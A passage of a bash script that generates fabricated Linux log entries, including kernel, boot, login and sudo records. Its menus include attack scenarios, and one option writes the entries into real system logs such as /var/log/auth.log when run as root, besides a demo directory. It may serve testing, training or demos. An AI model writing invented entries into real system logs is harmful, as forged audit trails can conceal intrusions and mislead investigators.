    # Rest of timestamps distributed throughout the time range
    for i in $(seq 1 $remaining_count); do
        local ts=$(generate_random_timestamp $start_time $end_time)
        timestamps+=($ts)
    done
    
    # Sort timestamps to ensure chronological order
    IFS=$'\n' sorted_timestamps=($(sort <<<"${timestamps[*]}"))
    unset IFS
    
    # Show progress
    show_notification "Generating kernel logs (this may take a while)..." "info"
    
    # Track current entry for progress bar
    local current_entry=0
    
    # Start with boot messages
    for ((i=0; i<${#boot_messages[@]}; i++)); do
        # Format timestamp for kernel log
        local boot_ts=$((boot_time + i)) # Sequential boot messages
        local kern_date=$(date -d @$boot_ts "+%b %d %H:%M:%S")
        local hostname=$(hostname)
        
        # Create the log entry
        local log_entry="$kern_date $hostname kernel: ${boot_messages[$i]}"
        
        # Write to kernel log file
        echo "$log_entry" >> "$kern_log_path"
        
        current_entry=$((current_entry + 1))
        show_progress $num_entries $current_entry "Generating kernel logs"
    done
    
    # Now add regular kernel messages
    for i in $(seq 1 $remaining_count); do
        # Use the sorted timestamp
        local timestamp=${sorted_timestamps[$((i-1))]}
        local kern_date=$(date -d @$timestamp "+%b %d %H:%M:%S")
        local hostname=$(hostname)
        
        # Choose a subsystem
        local subsystem=${kernel_subsystems[$RANDOM % ${#kernel_subsystems[@]}]}
        
        # Determine message type based on realism level
        local message_type=$((RANDOM % 100))
        local message=""
        
        # Different message type distribution based on realism level
        if [ "$realism_level" = "high" ]; then
            # High realism: More warnings and errors
            if [ $message_type -lt 70 ]; then
                # 70% normal messages
                message=${info_messages[$RANDOM % ${#info_messages[@]}]}
            elif [ $message_type -lt 90 ]; then
                # 20% warning messages
                message=${warning_messages[$RANDOM % ${#warning_messages[@]}]}
            else
                # 10% error messages
                message=${error_messages[$RANDOM % ${#error_messages[@]}]}
            fi
        else
            # Standard realism: Fewer warnings and errors
            if [ $message_type -lt 85 ]; then
                # 85% normal messages
                message=${info_messages[$RANDOM % ${#info_messages[@]}]}
            elif [ $message_type -lt 97 ]; then
                # 12% warning messages
                message=${warning_messages[$RANDOM % ${#warning_messages[@]}]}
            else
                # 3% error messages
                message=${error_messages[$RANDOM % ${#error_messages[@]}]}
            fi
        fi
        
        # Replace placeholders with realistic values
        message=$(echo "$message" | sed -E "s/%d/$(( RANDOM % 9999 ))/g")
        
        # Create the log entry
        local log_entry="$kern_date $hostname kernel: [$subsystem] $message"
        
        # Write to kernel log file
        echo "$log_entry" >> "$kern_log_path"
        
        current_entry=$((current_entry + 1))
        
        # Update progress every 10 entries
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $num_entries $current_entry "Generating kernel logs"
        fi
    done
    
    show_notification "Kernel logs generation complete!" "success"
    log_action "Completed generating kernel logs"
}

# Function to generate custom scenario logs
custom_fake_logs() {
    clear
    display_section_header "Custom Scenario Log Generation"
    
    # Show scenario options
    echo -e "${YELLOW}Select a scenario to generate logs for:${NC}"
    echo -e "${CYAN}1.${NC} System Boot Sequence"
    echo -e "${CYAN}2.${NC} User Login Activity (normal)"
    echo -e "${CYAN}3.${NC} Brute Force Attack Attempt"
    echo -e "${CYAN}4.${NC} System Crash and Recovery"
    echo -e "${CYAN}5.${NC} Web Server Attack"
    echo -e "${CYAN}6.${NC} Database Backup and Maintenance"
    echo -e "${CYAN}7.${NC} Custom Scenario (Advanced)"
    echo -e "${CYAN}8.${NC} Return to Previous Menu"
    
    read -p "$(echo -e "${YELLOW}Enter choice [1-8]:${NC} ")" scenario_choice
    
    # Calculate timestamps - use current time as end point
    local end_time=$(date +%s)
    local start_time=$((end_time - 3600)) # Default to 1 hour before
    
    # Determine number of entries based on density
    local num_entries
    case "$log_density" in
        "low") num_entries=50 ;;
        "medium") num_entries=150 ;;
        "high") num_entries=300 ;;
        "very-high") num_entries=600 ;;
        *) num_entries=150 ;;
    esac
    
    case $scenario_choice in
        1)
            # System Boot Sequence
            show_notification "Generating System Boot Sequence logs..." "info"
            log_action "Started generating system boot sequence logs"
            
            # Boot sequence should be sequential with proper timing
            local boot_start_time=$((end_time - 300)) # 5 minutes ago
            
            # Generate the boot sequence logs
            generate_boot_sequence_logs $boot_start_time $num_entries
            
            show_notification "System Boot Sequence logs generated" "success"
            ;;
        2)
            # User Login Activity
            show_notification "Generating User Login Activity logs..." "info"
            log_action "Started generating user login activity logs"
            
            # Ask for username (optional)
            read -p "$(echo -e "${YELLOW}Enter specific username (leave blank for random):${NC} ")" custom_username
            
            # Generate login activity logs
            generate_login_activity_logs $start_time $end_time $num_entries "$custom_username"
            
            show_notification "User Login Activity logs generated" "success"
            ;;
        3)
            # Brute Force Attack
            show_notification "Generating Brute Force Attack logs..." "info"
            log_action "Started generating brute force attack logs"
            
            # Ask for target username
            read -p "$(echo -e "${YELLOW}Enter target username (leave blank for random):${NC} ")" target_username
            
            # Ask for attacker IP
            read -p "$(echo -e "${YELLOW}Enter attacker IP (leave blank for random):${NC} ")" attacker_ip
            
            # Generate brute force logs
            generate_brute_force_logs $start_time $end_time $num_entries "$target_username" "$attacker_ip"
            
            show_notification "Brute Force Attack logs generated" "success"
            ;;
        4)
            # System Crash and Recovery
            show_notification "Generating System Crash and Recovery logs..." "info"
            log_action "Started generating system crash and recovery logs"
            
            # Generate crash logs
            generate_system_crash_logs $start_time $end_time $num_entries
            
            show_notification "System Crash and Recovery logs generated" "success"
            ;;
        5)
            # Web Server Attack
            show_notification "Generating Web Server Attack logs..." "info"
            log_action "Started generating web server attack logs"
            
            # Ask for attack type
            echo -e "${YELLOW}Select attack type:${NC}"
            echo -e "${CYAN}1.${NC} SQL Injection Attempt"
            echo -e "${CYAN}2.${NC} Directory Traversal"
            echo -e "${CYAN}3.${NC} XSS (Cross-Site Scripting)"
            echo -e "${CYAN}4.${NC} File Upload Exploit"
            echo -e "${CYAN}5.${NC} Mixed Attack Vectors"
            
            read -p "$(echo -e "${YELLOW}Enter choice [1-5]:${NC} ")" attack_type
            
            # Generate web attack logs
            generate_web_attack_logs $start_time $end_time $num_entries $attack_type
            
            show_notification "Web Server Attack logs generated" "success"
            ;;
        6)
            # Database Backup and Maintenance
            show_notification "Generating Database Backup and Maintenance logs..." "info"
            log_action "Started generating database maintenance logs"
            
            # Generate database maintenance logs
            generate_db_maintenance_logs $start_time $end_time $num_entries
            
            show_notification "Database Backup and Maintenance logs generated" "success"
            ;;
        7)
            # Custom Advanced Scenario
            show_notification "Setting up Custom Scenario..." "info"
            
            # Get custom scenario details
            echo -e "${YELLOW}Custom Scenario Setup:${NC}"
            
            # Time range
            echo -e "${CYAN}Time Range:${NC}"
            echo -e "1. Last hour"
            echo -e "2. Last day"
            echo -e "3. Last week"
            echo -e "4. Custom range"
            
            read -p "$(echo -e "${YELLOW}Select time range [1-4]:${NC} ")" time_range_choice
            
            case $time_range_choice in
                1) start_time=$((end_time - 3600)) ;; # 1 hour
                2) start_time=$((end_time - 86400)) ;; # 1 day
                3) start_time=$((end_time - 604800)) ;; # 1 week
                4) 
                    read -p "$(echo -e "${YELLOW}Enter custom start time (YYYY-MM-DD HH:MM:SS):${NC} ")" custom_start_time
                    # Convert input to timestamp if provided
                    if [ -n "$custom_start_time" ]; then
                        start_time=$(date -d "$custom_start_time" +%s 2>/dev/null || echo $start_time)
                    fi
                    ;;
            esac
            
            # Log types to include
            echo -e "\n${CYAN}Select log types to include:${NC}"
            echo -e "1. System logs"
            echo -e "2. Authentication logs"
            echo -e "3. Kernel logs"
            echo -e "4. Web server logs"
            echo -e "5. Database logs"
            echo -e "6. All log types"
            
            read -p "$(echo -e "${YELLOW}Enter selection [1-6]:${NC} ")" log_type_choice
            
            # Process selection
            case $log_type_choice in
                1) generate_system_logs $start_time $end_time $num_entries ;;
                2) generate_auth_logs $start_time $end_time $num_entries ;;
                3) generate_kernel_logs $start_time $end_time $num_entries ;;
                4) generate_web_logs $start_time $end_time $num_entries ;;
                5) generate_db_logs $start_time $end_time $num_entries ;;
                6) 
                    generate_system_logs $start_time $end_time $num_entries
                    generate_auth_logs $start_time $end_time $num_entries
                    generate_kernel_logs $start_time $end_time $((num_entries / 2))
                    generate_web_logs $start_time $end_time $((num_entries * 2))
                    generate_db_logs $start_time $end_time $num_entries
                    ;;
            esac
            
            show_notification "Custom Scenario logs generated" "success"
            ;;
        8)
            # Return to previous menu
            return 0
            ;;
        *)
            show_notification "Invalid option" "error"
            sleep 1
            custom_fake_logs
            return 0
            ;;
    esac
    
    echo ""
    read -p "$(echo -e "${GREEN}Press Enter to continue...${NC}")"
    return 0
}

# Function to generate boot sequence logs
generate_boot_sequence_logs() {
    local boot_start_time="$1"
    local num_entries="$2"
    
    # Determine which logs to write to
    local system_log_path=$(get_appropriate_log_path "$SYSLOG_PATH")
    local kern_log_path=$(get_appropriate_log_path "$KERN_LOG_PATH")
    
    # Ensure directories exist
    ensure_log_directory "$system_log_path" || return 1
    ensure_log_directory "$kern_log_path" || return 1
    
    # Create files if they don't exist
    for log_path in "$system_log_path" "$kern_log_path"; do
        if [ ! -f "$log_path" ]; then
            touch "$log_path" 2>/dev/null || {
                show_notification "Error: Cannot create log file: $log_path" "error"
                return 1
            }
        fi
    done
    
    # Get hostname
    local hostname=$(hostname)
    
    # Boot sequence messages
    local boot_messages=(
        # Kernel initialization
        "kernel: Linux version 5.15.0-76-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #83-Ubuntu SMP"
        "kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-5.15.0-76-generic root=UUID=43c9a908-9d36-40e8-92ac-3f351e3b3999 ro quiet splash"
        "kernel: BIOS-provided physical RAM map:"
        "kernel: ACPI: RSDP 0x00000000000F0000 000024 (v02 DELL  )"
        "kernel: ACPI: XSDT 0x00000000C9FFE120 00008C (v01 DELL   CBX3     01072009 AMI  00010013)"
        "kernel: Reserving Intel graphics memory at [mem 0xda800000-0xdfefffff]"
        "kernel: ACPI: Core revision 20210730"
        "kernel: clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x24089c51b93, max_idle_ns: 440795253511 ns"
        "kernel: DMAR: Host address width 39"
        "kernel: DMAR: DRHD base: 0x000000fed90000 flags: 0x0"
        "kernel: DMAR: IOMMU 0: reg_base_addr fed90000 ver 1:0 cap d2078c106f0462 ecap f020fe"
        "kernel: DMAR: RMRR base: 0x000000da7ff000 end: 0x000000da800fff"
        "kernel: DMAR: RMRR base: 0x000000db000000 end: 0x000000df1fffff"
        "kernel: pci 0000:00:02.0: BAR 2: assigned to efifb"
        
        # System initialization
        "systemd[1]: Starting system..."
        "systemd[1]: Detected virtualization kvm."
        "systemd[1]: Detected architecture x86-64."
        "systemd[1]: Set hostname to <$hostname>."
        "systemd[1]: Initializing machine ID from random generator."
        "systemd[1]: Started Journal Service."
        "systemd-journald[312]: Received request to flush runtime journal from PID 1"
        "systemd[1]: Starting Load Kernel Modules..."
        "systemd[1]: Starting Remount Root and Kernel File Systems..."
        "systemd[1]: Starting Create list of static device nodes for the current kernel..."
        "systemd[1]: Finished Create list of static device nodes for the current kernel."
        
        # Filesystem
        "kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode"
        "systemd[1]: Mounted /boot."
        "systemd[1]: Mounting /home..."
        "systemd[1]: Mounted /home."
        
        # Network initialization
        "systemd[1]: Starting Network Service..."
        "systemd[1]: Started Network Service."
        "NetworkManager[789]: <info>  [1622012345.5678] NetworkManager (version 1.36.6) starting..."
        "NetworkManager[789]: <info>  [1622012345.5680] Read config: /etc/NetworkManager/NetworkManager.conf"
        "NetworkManager[789]: <info>  [1622012345.7890] ifupdown: management mode: unmanaged"
        "NetworkManager[789]: <info>  [1622012346.1234] Loaded device plugin: NMWifiFactory"
        "NetworkManager[789]: <info>  [1622012346.3456] Loaded device plugin: NMBluezManager"
        "NetworkManager[789]: <info>  [1622012346.5678] manager: startup complete"
        "kernel: r8169 0000:03:00.0 eth0: link up"
        "NetworkManager[789]: <info>  [1622012347.1234] device (eth0): carrier: link connected"
        "NetworkManager[789]: <info>  [1622012347.5678] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready"
        
        # Services startup
        "systemd[1]: Starting System Logging Service..."
        "systemd[1]: Started System Logging Service."
        "systemd[1]: Starting OpenSSH Server..."
        "systemd[1]: Started OpenSSH Server."
        "systemd[1]: Started CUPS Scheduler."
        "systemd[1]: Starting Avahi mDNS/DNS-SD Stack..."
        "systemd[1]: Started Avahi mDNS/DNS-SD Stack."
        "systemd[1]: Started GNOME Display Manager."
        "systemd[1]: Starting Authorization Manager..."
        "systemd[1]: Starting Accounts Service..."
        "systemd[1]: Started Authorization Manager."
        "systemd[1]: Started Accounts Service."
        "systemd[1]: Starting Modem Manager..."
        "systemd[1]: Started Modem Manager."
        "systemd[1]: Starting Bluetooth service..."
        "systemd[1]: Started Bluetooth service."
        
        # Session
        "systemd[1]: Reached target Graphical Interface."
        "systemd[1]: Starting Update UTMP about System Runlevel Changes..."
        "systemd[1]: Started Update UTMP about System Runlevel Changes."
        "systemd[1]: Startup finished in 37.432s (firmware) + 5.859s (loader) + 2.512s (kernel) + 30.831s (userspace) = 76.634s."
    )
    
    # Show progress
    show_notification "Generating boot sequence logs..." "info"
    
    # Track current entry for progress bar
    local current_entry=0
    local total_entries=${#boot_messages[@]}
    
    # Calculate time increments (spread over about 90 seconds for boot)
    local time_increment=$((90 / total_entries))
    local current_time=$boot_start_time
    
    # Write boot entries
    for message in "${boot_messages[@]}"; do
        # Format timestamp
        local log_date=$(date -d @$current_time "+%b %d %H:%M:%S")
        
        # Create the log entry
        local log_entry="$log_date $hostname $message"
        
        # Determine which log file to write to based on message content
        if [[ "$message" == kernel:* ]]; then
            echo "$log_entry" >> "$kern_log_path"
        else
            echo "$log_entry" >> "$system_log_path"
        fi
        
        # Increment time and entry counter
        current_time=$((current_time + time_increment))
        current_entry=$((current_entry + 1))
        
        # Update progress every few entries
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating boot sequence"
        fi
    done
    
    show_notification "Boot sequence logs generated" "success"
    log_action "Generated boot sequence logs starting at $(date -d @$boot_start_time)"
    
    return 0
}

# Function to set log generation preferences
set_generation_preferences() {
    clear
    display_section_header "Log Generation Settings"
    
    # Show current settings
    echo -e "${YELLOW}Current Settings:${NC}"
    echo -e "${CYAN}Log Density:${NC} $log_density"
    echo -e "${CYAN}Time Frame:${NC} $time_frame"
    echo -e "${CYAN}Realism Level:${NC} $realism_level"
    echo ""
    
    # Log Density options
    echo -e "${YELLOW}Select Log Density:${NC}"
    echo -e "${CYAN}1.${NC} Low (fewer entries)"
    echo -e "${CYAN}2.${NC} Medium (default)"
    echo -e "${CYAN}3.${NC} High (more entries)"
    echo -e "${CYAN}4.${NC} Very High (many entries)"
    
    read -p "$(echo -e "${YELLOW}Enter choice [1-4]:${NC} ")" density_choice
    
    case $density_choice in
        1) log_density="low" ;;
        2) log_density="medium" ;;
        3) log_density="high" ;;
        4) log_density="very-high" ;;
        *) echo -e "${YELLOW}Invalid choice, keeping current setting: $log_density${NC}" ;;
    esac
    
    # Time Frame options
    echo -e "\n${YELLOW}Select Time Frame for Generated Logs:${NC}"
    echo -e "${CYAN}1.${NC} 1 hour"
    echo -e "${CYAN}2.${NC} 12 hours"
    echo -e "${CYAN}3.${NC} 24 hours"
    echo -e "${CYAN}4.${NC} 7 days"
    echo -e "${CYAN}5.${NC} 30 days"
    
    read -p "$(echo -e "${YELLOW}Enter choice [1-5]:${NC} ")" time_choice
    
    case $time_choice in
        1) time_frame="1h" ;;
        2) time_frame="12h" ;;
        3) time_frame="24h" ;;
        4) time_frame="7d" ;;
        5) time_frame="30d" ;;
        *) echo -e "${YELLOW}Invalid choice, keeping current setting: $time_frame${NC}" ;;
    esac
    
    # Realism Level options
    echo -e "\n${YELLOW}Select Realism Level:${NC}"
    echo -e "${CYAN}1.${NC} Low (mostly normal operations)"
    echo -e "${CYAN}2.${NC} Medium (some errors/warnings)"
    echo -e "${CYAN}3.${NC} High (more realistic mix with errors)"
    
    read -p "$(echo -e "${YELLOW}Enter choice [1-3]:${NC} ")" realism_choice
    
    case $realism_choice in
        1) realism_level="low" ;;
        2) realism_level="medium" ;;
        3) realism_level="high" ;;
        *) echo -e "${YELLOW}Invalid option, keeping current setting: $realism_level${NC}" ;;
    esac
    
    # Save settings to config file if it exists
    if [ -f "$CONFIG_FILE" ]; then
        # Update or add settings
        if grep -q "^LOG_DENSITY=" "$CONFIG_FILE"; then
            sed -i "s/^LOG_DENSITY=.*/LOG_DENSITY=\"$log_density\"/" "$CONFIG_FILE"
        else
            echo "LOG_DENSITY=\"$log_density\"" >> "$CONFIG_FILE"
        fi
        
        if grep -q "^TIME_FRAME=" "$CONFIG_FILE"; then
            sed -i "s/^TIME_FRAME=.*/TIME_FRAME=\"$time_frame\"/" "$CONFIG_FILE"
        else
            echo "TIME_FRAME=\"$time_frame\"" >> "$CONFIG_FILE"
        fi
        
        if grep -q "^REALISM_LEVEL=" "$CONFIG_FILE"; then
            sed -i "s/^REALISM_LEVEL=.*/REALISM_LEVEL=\"$realism_level\"/" "$CONFIG_FILE"
        else
            echo "REALISM_LEVEL=\"$realism_level\"" >> "$CONFIG_FILE"
        fi
        
        show_notification "Settings saved to configuration file" "success"
    else
        show_notification "No configuration file found, settings are for this session only" "warning"
    fi
    
    # Set global variables for current session
    LOG_DENSITY="$log_density"
    TIME_FRAME="$time_frame"
    REALISM_LEVEL="$realism_level"
    
    log_action "Updated log generation settings: density=$log_density, time_frame=$time_frame, realism=$realism_level"
    
    # Show updated settings
    echo -e "\n${YELLOW}Updated Settings:${NC}"
    echo -e "${CYAN}Log Density:${NC} $log_density"
    echo -e "${CYAN}Time Frame:${NC} $time_frame"
    echo -e "${CYAN}Realism Level:${NC} $realism_level"
    
    echo ""
    read -p "$(echo -e "${GREEN}Press Enter to continue...${NC}")"
    return 0
}

# Function to select custom log directories
configure_log_directories() {
    clear
    display_section_header "Configure Log Directories"
    
    # Show current paths
    echo -e "${YELLOW}Current Log Paths:${NC}"
    echo -e "${CYAN}System Log:${NC} $SYSLOG_PATH"
    echo -e "${CYAN}Auth Log:${NC} $AUTH_LOG_PATH"
    echo -e "${CYAN}Kernel Log:${NC} $KERN_LOG_PATH"
    echo -e "${CYAN}Apache Access Log:${NC} $APACHE_ACCESS_LOG_PATH"
    echo -e "${CYAN}Nginx Access Log:${NC} $NGINX_ACCESS_LOG_PATH"
    echo -e "${CYAN}MySQL Error Log:${NC} $MYSQL_ERROR_LOG_PATH"
    echo ""
    
    # Option to use real or demo paths
    echo -e "${YELLOW}Select Path Mode:${NC}"
    echo -e "${CYAN}1.${NC} Use Real System Paths (requires root)"
    echo -e "${CYAN}2.${NC} Use Demo Paths (for testing/demo)"
    echo -e "${CYAN}3.${NC} Set Custom Paths"
    echo -e "${CYAN}4.${NC} Return to Previous Menu"
    
    read -p "$(echo -e "${YELLOW}Enter choice [1-4]:${NC} ")" path_choice
    
    case $path_choice in
        1)
            # Use real system paths
            SYSLOG_PATH="/var/log/syslog"
            AUTH_LOG_PATH="/var/log/auth.log"
            KERN_LOG_PATH="/var/log/kern.log"
            APACHE_ACCESS_LOG_PATH="/var/log/apache2/access.log"
            NGINX_ACCESS_LOG_PATH="/var/log/nginx/access.log"
            MYSQL_ERROR_LOG_PATH="/var/log/mysql/error.log"
            
            show_notification "Using real system paths" "info"
            log_action "Set log paths to real system paths"
            
            # Check if root
            if [ "$EUID" -ne 0 ]; then
                show_notification "Warning: You need root privileges to write to these paths!" "warning"
            fi
            ;;
        2)
            # Use demo paths
            SYSLOG_PATH="logs/fake/syslog"
            AUTH_LOG_PATH="logs/fake/auth.log"
            KERN_LOG_PATH="logs/fake/kern.log"
            APACHE_ACCESS_LOG_PATH="logs/fake/apache2/access.log"
            NGINX_ACCESS_LOG_PATH="logs/fake/nginx/access.log"
            MYSQL_ERROR_LOG_PATH="logs/fake/mysql/error.log"
            
            show_notification "Using demo paths in 'logs/fake/' directory" "info"
            log_action "Set log paths to demo paths"
            ;;
        3)
            # Set custom paths
            echo -e "\n${YELLOW}Enter custom paths (leave blank to keep current):${NC}"
            
            read -p "$(echo -e "${CYAN}System Log Path:${NC} ")" custom_syslog
            if [ -n "$custom_syslog" ]; then
                SYSLOG_PATH="$custom_syslog"
            fi
            
            read -p "$(echo -e "${CYAN}Auth Log Path:${NC} ")" custom_authlog
            if [ -n "$custom_authlog" ]; then
                AUTH_LOG_PATH="$custom_authlog"
            fi
            
            read -p "$(echo -e "${CYAN}Kernel Log Path:${NC} ")" custom_kernlog
            if [ -n "$custom_kernlog" ]; then
                KERN_LOG_PATH="$custom_kernlog"
            fi
            
            read -p "$(echo -e "${CYAN}Apache Access Log Path:${NC} ")" custom_apache
            if [ -n "$custom_apache" ]; then
                APACHE_ACCESS_LOG_PATH="$custom_apache"
            fi
            
            read -p "$(echo -e "${CYAN}Nginx Access Log Path:${NC} ")" custom_nginx
            if [ -n "$custom_nginx" ]; then
                NGINX_ACCESS_LOG_PATH="$custom_nginx"
            fi
            
            read -p "$(echo -e "${CYAN}MySQL Error Log Path:${NC} ")" custom_mysql
            if [ -n "$custom_mysql" ]; then
                MYSQL_ERROR_LOG_PATH="$custom_mysql"
            fi
            
            show_notification "Custom paths set" "success"
            log_action "Set custom log paths"
            ;;
        4)
            # Return without changes
            return 0
            ;;
        *)
            show_notification "Invalid choice" "error"
            sleep 1
            configure_log_directories
            return 0
            ;;
    esac
    
    # Save to config file if it exists
    if [ -f "$CONFIG_FILE" ]; then
        if confirm_action "Save these paths to the configuration file?" "Y"; then
            # Update or add settings
            if grep -q "^SYSLOG_PATH=" "$CONFIG_FILE"; then
                sed -i "s|^SYSLOG_PATH=.*|SYSLOG_PATH=\"$SYSLOG_PATH\"|" "$CONFIG_FILE"
            else
                echo "SYSLOG_PATH=\"$SYSLOG_PATH\"" >> "$CONFIG_FILE"
            fi
            
            if grep -q "^AUTH_LOG_PATH=" "$CONFIG_FILE"; then
                sed -i "s|^AUTH_LOG_PATH=.*|AUTH_LOG_PATH=\"$AUTH_LOG_PATH\"|" "$CONFIG_FILE"
            else
                echo "AUTH_LOG_PATH=\"$AUTH_LOG_PATH\"" >> "$CONFIG_FILE"
            fi
            
            if grep -q "^KERN_LOG_PATH=" "$CONFIG_FILE"; then
                sed -i "s|^KERN_LOG_PATH=.*|KERN_LOG_PATH=\"$KERN_LOG_PATH\"|" "$CONFIG_FILE"
            else
                echo "KERN_LOG_PATH=\"$KERN_LOG_PATH\"" >> "$CONFIG_FILE"
            fi
            
            if grep -q "^APACHE_ACCESS_LOG_PATH=" "$CONFIG_FILE"; then
                sed -i "s|^APACHE_ACCESS_LOG_PATH=.*|APACHE_ACCESS_LOG_PATH=\"$APACHE_ACCESS_LOG_PATH\"|" "$CONFIG_FILE"
            else
                echo "APACHE_ACCESS_LOG_PATH=\"$APACHE_ACCESS_LOG_PATH\"" >> "$CONFIG_FILE"
            fi
            
            if grep -q "^NGINX_ACCESS_LOG_PATH=" "$CONFIG_FILE"; then
                sed -i "s|^NGINX_ACCESS_LOG_PATH=.*|NGINX_ACCESS_LOG_PATH=\"$NGINX_ACCESS_LOG_PATH\"|" "$CONFIG_FILE"
            else
                echo "NGINX_ACCESS_LOG_PATH=\"$NGINX_ACCESS_LOG_PATH\"" >> "$CONFIG_FILE"
            fi
            
            if grep -q "^MYSQL_ERROR_LOG_PATH=" "$CONFIG_FILE"; then
                sed -i "s|^MYSQL_ERROR_LOG_PATH=.*|MYSQL_ERROR_LOG_PATH=\"$MYSQL_ERROR_LOG_PATH\"|" "$CONFIG_FILE"
            else
                echo "MYSQL_ERROR_LOG_PATH=\"$MYSQL_ERROR_LOG_PATH\"" >> "$CONFIG_FILE"
            fi
            
            show_notification "Paths saved to configuration file" "success"
            log_action "Saved log paths to configuration file"
        fi
    fi
    
    # Show updated paths
    echo -e "\n${YELLOW}Updated Log Paths:${NC}"
    echo -e "${CYAN}System Log:${NC} $SYSLOG_PATH"
    echo -e "${CYAN}Auth Log:${NC} $AUTH_LOG_PATH"
    echo -e "${CYAN}Kernel Log:${NC} $KERN_LOG_PATH"
    echo -e "${CYAN}Apache Access Log:${NC} $APACHE_ACCESS_LOG_PATH"
    echo -e "${CYAN}Nginx Access Log:${NC} $NGINX_ACCESS_LOG_PATH"
    echo -e "${CYAN}MySQL Error Log:${NC} $MYSQL_ERROR_LOG_PATH"
    
    echo ""
    read -p "$(echo -e "${GREEN}Press Enter to continue...${NC}")"
    return 0
}

# Helper function to generate a random timestamp between start and end
generate_random_timestamp() {
    local start_time="$1"
    local end_time="$2"
    local time_diff=$((end_time - start_time))
    local random_offset=$((RANDOM % time_diff))
    echo $((start_time + random_offset))
}

# Function to generate login activity logs
generate_login_activity_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    local specific_user="$4"
    
    # Get appropriate log path
    local auth_log_path=$(get_appropriate_log_path "$AUTH_LOG_PATH")
    
    # Ensure directory exists
    ensure_log_directory "$auth_log_path" || return 1
    
    # Create file if it doesn't exist
    if [ ! -f "$auth_log_path" ]; then
        touch "$auth_log_path" 2>/dev/null || {
            show_notification "Error: Cannot create auth log file: $auth_log_path" "error"
            log_action "Error: Cannot create auth log file: $auth_log_path"
            return 1
        }
    fi
    
    # Authentication services
    local auth_services=("sshd" "login" "gdm-password" "lightdm" "su" "sudo" "systemd-logind" "polkit-agent-helper-1")
    
    # Users - use specific user if provided, otherwise use a list
    local users
    if [ -n "$specific_user" ]; then
        users=("$specific_user")
    else
        users=("root" "admin" "user" "john" "alice" "bob" "dave" "carol" "eve" "sysadmin" "www-data" "$(whoami)")
    fi
    
    # Remote IPs - for SSH connections
    local remote_ips=("192.168.1.100" "192.168.1.101" "10.0.0.15" "10.0.0.23" "172.16.0.5" "172.16.0.10")
    
    # User login/logout patterns
    local login_patterns=(
        # SSH login
        "sshd: Accepted password for USER from IP port PORT ssh2"
        "sshd: Accepted publickey for USER from IP port PORT ssh2"
        # Local login
        "login: pam_unix(login:session): session opened for user USER by LOGIN(uid=0)"
        # GUI login
        "gdm-password: pam_unix(gdm-password:session): session opened for user USER by (uid=0)"
        "lightdm: pam_unix(lightdm:session): session opened for user USER by (uid=0)"
        # Sudo
        "sudo: USER : TTY=pts/0 ; PWD=/home/USER ; USER=root ; COMMAND=/usr/bin/COMMAND"
        "sudo: pam_unix(sudo:session): session opened for user root by USER(uid=UID)"
        # Su
        "su: (to root) USER on pts/0"
        "su: pam_unix(su:session): session opened for user USER by (uid=UID)"
        # Systemd
        "systemd-logind: New session SESSION_ID of user USER."
        "systemd: pam_unix(systemd-user:session): session opened for user USER by (uid=0)"
    )
    
    local logout_patterns=(
        # SSH logout
        "sshd: pam_unix(sshd:session): session closed for user USER"
        # Local logout
        "login: pam_unix(login:session): session closed for user USER"
        # GUI logout
        "gdm-password: pam_unix(gdm-password:session): session closed for user USER"
        "lightdm: pam_unix(lightdm:session): session closed for user USER"
        # Sudo
        "sudo: pam_unix(sudo:session): session closed for user root"
        # Su
        "su: pam_unix(su:session): session closed for user USER"
        # Systemd
        "systemd-logind: Session SESSION_ID logged out."
        "systemd: pam_unix(systemd-user:session): session closed for user USER"
    )
    
    # Create timestamps with a realistic pattern
    # Users typically log in, do some work, then log out
    local timestamps=()
    local session_data=()
    
    # Number of login/logout sessions
    local session_count=$((num_entries / 2))
    
    # Generate login/logout sessions
    for ((i=0; i<session_count; i++)); do
        # Choose a random user
        local user=${users[$RANDOM % ${#users[@]}]}
        
        # Randomly select a login method
        local service=${auth_services[$RANDOM % ${#auth_services[@]}]}
        
        # Generate session start time
        local session_start=$(generate_random_timestamp $start_time $end_time)
        
        # Session duration (5 min to 4 hours)
        local session_duration=$((RANDOM % 14400 + 300))
        
        # Calculate session end time
        local session_end=$((session_start + session_duration))
        
        # Adjust if session ends after end_time
        if [ $session_end -gt $end_time ]; then
            session_end=$end_time
        fi
        
        # Generate a session ID
        local session_id=$((RANDOM % 1000 + 1))
        
        # Store session data
        session_data+=("$user|$service|$session_start|$session_end|$session_id")
    done
    
    # Track current entry for progress bar
    local current_entry=0
    local total_entries=$((session_count * 2)) # Login + logout entries
    
    show_notification "Generating login activity logs..." "info"
    
    # Process each session and create login/logout entries
    for session in "${session_data[@]}"; do
        # Parse session data
        IFS='|' read -r user service session_start session_end session_id <<< "$session"
        
        # Choose remote IP for SSH connections
        local remote_ip=${remote_ips[$RANDOM % ${#remote_ips[@]}]}
        local remote_port=$((RANDOM % 60000 + 1024))
        
        # Choose a command for sudo entries
        local commands=("apt update" "apt upgrade" "nano /etc/passwd" "cat /var/log/auth.log" "systemctl restart apache2" "fdisk -l" "tail -f /var/log/syslog")
        local command=${commands[$RANDOM % ${#commands[@]}]}
        
        # User ID
        local uid=$((RANDOM % 1000 + 1000))
        
        # Login entry
        local login_pattern=${login_patterns[$RANDOM % ${#login_patterns[@]}]}
        local login_date=$(date -d @$session_start "+%b %d %H:%M:%S")
        local hostname=$(hostname)
        
        # Replace placeholders
        login_pattern=${login_pattern//USER/$user}
        login_pattern=${login_pattern//IP/$remote_ip}
        login_pattern=${login_pattern//PORT/$remote_port}
        login_pattern=${login_pattern//UID/$uid}
        login_pattern=${login_pattern//COMMAND/$command}
        login_pattern=${login_pattern//SESSION_ID/$session_id}
        
        # Create the login entry
        local login_entry="$login_date $hostname $login_pattern"
        
        # Write to auth log file
        echo "$login_entry" >> "$auth_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating login activity"
        fi
        
        # Only add logout if session has ended
        if [ $session_end -lt $end_time ]; then
            # Logout entry
